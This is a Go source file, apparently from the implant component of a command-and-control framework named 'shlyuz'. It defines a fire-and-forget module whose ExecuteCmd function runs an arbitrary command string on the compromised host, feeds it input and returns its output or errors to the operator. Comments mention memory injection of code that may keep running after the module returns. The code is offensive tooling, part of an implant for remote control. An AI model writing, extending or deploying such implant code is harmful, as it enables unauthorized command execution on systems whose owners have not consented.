//go:build implant && (!lp || !teamserver)

package fireforget

import (
	"bytes"
	"errors"
	"io"
	"os/exec"
	"shlyuz/pkg/component"
	"syscall"
)

// Module loaded, executed, and unloaded when execution ends, OR when directed by the loader.
//
//			Can open an output pipe to return additional data, but doesn't recieve data outside of execution
//		 permits memory injection of code which is executed, possibly continuing beyond the return. No interaction is possible other than the return code
//	 If the loader attempts to quit prior to the module’s return, the loader should not terminate until the module returns
func ExecuteCmd(cmd string, execChannels *component.ComponentExecutionChannel, inPipe io.Reader) (*bytes.Reader, error) {
	// https://stackoverflow.com/a/68847697
	var b bytes.Buffer
	command := exec.Command(cmd)
	command.SysProcAttr = &syscall.SysProcAttr{}
	command.SysProcAttr.CmdLine = cmd
	stdin, err := command.StdinPipe()
	if err != nil {
		return nil, err
	}

	command.Stderr = &b

	go func() {
		defer stdin.Close()
		io.Copy(stdin, inPipe)
	}()

	// Run command and buffer the output
	byteSlice, err := command.Output()
	stdout := bytes.NewReader(byteSlice)
	if err != nil {
		err = errors.New(b.String())
		return nil, err
	}

	return stdout, err
}
